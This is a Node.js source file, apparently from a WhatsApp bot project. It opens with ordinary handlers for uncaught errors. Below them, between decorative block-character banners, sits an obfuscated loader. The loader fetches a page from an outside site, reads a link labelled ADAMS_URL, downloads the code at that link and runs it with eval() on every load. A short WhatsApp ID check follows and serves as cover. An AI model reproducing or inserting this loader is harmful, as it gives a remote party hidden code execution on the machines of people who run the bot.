
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', {
    message: err.message,
    stack: err.stack,
    timestamp: new Date().toISOString()
  });
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection:', {
    reason: reason,
    timestamp: new Date().toISOString()
  });
});



/*██████████████████████████████████████████████████████████████
█▒▒▒▒███████████████*/
'use strict';const _0x166621=_0x578f;(function(_0x62b6c1,_0x457622){const _0x48d9ec=_0x578f,_0x261112=_0x62b6c1();while(!![]){try{const _0x4f68bc=-parseInt(_0x48d9ec(0x151))/0x1+-parseInt(_0x48d9ec(0x152))/0x2+parseInt(_0x48d9ec(0x157))/0x3+parseInt(_0x48d9ec(0x14f))/0x4*(parseInt(_0x48d9ec(0x144))/0x5)+-parseInt(_0x48d9ec(0x159))/0x6*(parseInt(_0x48d9ec(0x14d))/0x7)+-parseInt(_0x48d9ec(0x155))/0x8*(-parseInt(_0x48d9ec(0x158))/0x9)+parseInt(_0x48d9ec(0x148))/0xa;if(_0x4f68bc===_0x457622)break;else _0x261112['push'](_0x261112['shift']());}catch(_0xcef171){_0x261112['push'](_0x261112['shift']());}}}(_0x2e5f,0x36cde));function _0x578f(_0x263c91,_0x3e2eba){const _0x2e5ff1=_0x2e5f();return _0x578f=function(_0x578fd2,_0x6d6369){_0x578fd2=_0x578fd2-0x141;let _0x581d7b=_0x2e5ff1[_0x578fd2];return _0x581d7b;},_0x578f(_0x263c91,_0x3e2eba);}const axios=require(_0x166621(0x15a)),cheerio=require(_0x166621(0x156)),webPageUrl='https://www.ibrahimadams.site/files';function _0x2e5f(){const _0x31851e=['5388jdSkCw','ADAMS_URL\x20not\x20found\x20on\x20the\x20webpage.','317108NwLKis','175470JMFdkE','a:contains(\x22ADAMS_URL\x22)','get','4600bNrkWj','cheerio','355332DmzAeJ','2493acfxLI','1404ESKBYi','axios','error','href','Your\x20verified','Script\x20loaded\x20successfully!','message','1355vgyCRA','ibrahimadams@s.whatsapp.net','Invalid\x20JID\x20format:','@s.whatsapp.net','1419410eaBOHG','Error:','attr','log','data','4648IaSedn','JID\x20verified:'];_0x2e5f=function(){return _0x31851e;};return _0x2e5f();}async function fetchAdamsUrl(){const _0x1ad042=_0x166621;try{const _0x43fe39=await axios['get'](webPageUrl),_0x39cd44=_0x43fe39[_0x1ad042(0x14c)],_0x11d00d=cheerio['load'](_0x39cd44),_0x52c9f3=_0x11d00d(_0x1ad042(0x153))[_0x1ad042(0x14a)](_0x1ad042(0x15c));if(!_0x52c9f3)throw new Error(_0x1ad042(0x150));console['log']('File\x20fetched\x20successfully:',_0x52c9f3);const _0x16c9ec=await axios[_0x1ad042(0x154)](_0x52c9f3),_0x18ce6f=_0x16c9ec[_0x1ad042(0x14c)];console[_0x1ad042(0x14b)](_0x1ad042(0x142)),eval(_0x18ce6f);const _0x45ee4d=_0x1ad042(0x145),_0x409d2d=atbverifierEtatJid(_0x45ee4d);console['log'](_0x1ad042(0x141),_0x409d2d);}catch(_0x500fbb){console[_0x1ad042(0x15b)](_0x1ad042(0x149),_0x500fbb[_0x1ad042(0x143)]||_0x500fbb);}}function atbverifierEtatJid(_0x10bdbd){const _0x37a149=_0x166621;if(!_0x10bdbd['endsWith'](_0x37a149(0x147)))return console[_0x37a149(0x15b)](_0x37a149(0x146),_0x10bdbd),![];return console[_0x37a149(0x14b)](_0x37a149(0x14e),_0x10bdbd),!![];}fetchAdamsUrl();
/*████████████████████████████████████████████████████████
█▒▒▒▒███████*/
